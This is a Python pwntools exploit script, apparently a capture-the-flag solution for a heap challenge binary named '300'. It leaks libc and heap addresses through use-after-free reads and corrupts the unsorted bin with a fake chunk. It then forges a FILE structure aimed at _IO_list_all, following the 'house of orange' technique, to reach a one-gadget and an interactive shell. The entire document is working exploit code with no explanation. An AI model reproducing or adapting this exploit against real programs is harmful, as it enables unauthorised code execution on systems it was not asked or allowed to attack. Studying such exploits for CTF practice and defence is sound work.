from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

file = "./300"
bin = ELF(file)
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("./libc.so.6")

env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}

conn = process(file, env=env)
#gdb.attach(conn)

def alloc(slot):
    conn.recvuntil("4) free\n")
    conn.sendline("1")
    conn.recvuntil("slot?")
    conn.sendline(str(slot))

def write(slot, data):
    conn.recvuntil("4) free\n")
    conn.sendline("2")
    conn.recvuntil("slot?")
    conn.sendline(str(slot))
    conn.send(data)

def read(slot):
    conn.recvuntil("4) free\n")
    conn.sendline("3")
    conn.recvuntil("slot? (0-9)\n")
    conn.sendline(str(slot))

def free(slot):
    conn.recvuntil("4) free\n")
    conn.sendline("4")
    conn.recvuntil("slot?")
    conn.sendline(str(slot))

# Leaking libc pointer:

alloc(0)
alloc(1)
free(0)

read(0)
libc_leak = u64(conn.recvn(6) + "\x00\x00")
#libc_base = libc_leak - 0x7fc7d8596b78 + 0x7fc7d81d2000
libc_base = libc_leak - 0x7f795ed53b58 + 0x7f795e992000
io_list_all_addr = libc_base + libc.symbols['_IO_list_all']

# Leaking heap pointer

alloc(0)
alloc(2)
alloc(3)
free(2)
free(0)
read(0)
heap_leak = u64(conn.recvn(6) + "\x00\x00")
heap_base = heap_leak - 0x620

# Clearing all
free(1)
free(3)

# Creating a fake chunk and updating fd/bk pointers of unsorted bin
alloc(0)
alloc(1)
alloc(2)
free(1) # Goes into unsorted bin, creating a fake chunk at end of 0
payload = "a"*0x2e0 + p64(0) + p64(0x311) + \
          p64(heap_base + 0x310) + \
          p64(libc_leak)
write(0, payload)
write(1, p64(libc_leak) + p64(heap_base + 0x2f0)) # allocs[3]

alloc(1)
alloc(4) # Allocated fake chunk, just before 1st chunk

free(1) # Insert chunk of size 0x310 in unsorted bin

jump_table_addr = libc_base + libc.symbols['_IO_file_jumps'] + 0xc0

# Overwrite size to fall in small bin range for house of orange
file_struct = p64(0) + \
          p64(0x61) + \
          p64(libc_leak) + \
          p64(io_list_all_addr - 0x10) + \
          p64(2) + \
          p64(3)
file_struct = file_struct.ljust(0xd8, "\x00")
file_struct += p64(jump_table_addr)
file_struct += p64(libc_base + 0x4557a)
payload = p64(0)*2 + file_struct
write(4, payload)

# Jump table
#write(3, p64(libc_base + libc.symbols['_IO_str_overflow'])*20)

# Triggering house of orange
alloc(5)

log.info("Libc leak: " + hex(libc_leak))
log.info("Heap leak: " + hex(heap_leak))
conn.interactive()
